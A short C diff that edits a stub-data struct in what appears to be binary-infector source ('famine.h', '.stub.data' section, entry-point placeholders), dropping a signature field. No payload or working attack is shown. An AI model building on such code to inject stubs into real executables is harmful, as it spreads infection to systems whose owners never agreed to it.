@@ -12,7 +12,7 @@
 #include "famine.h"
 
 __attribute__((section(".stub.data")))
-t_stub_32_data	g_stub_data = {.entry_point = 0x4242, .stub_virt_off = 0x4242, .sign = FAMINE_SIGN};
+t_stub_32_data	g_stub_data = {.entry_point = 0x4242, .stub_virt_off = 0x4242};
 
 extern char	stub_begin[];
 extern char	stub_end[];
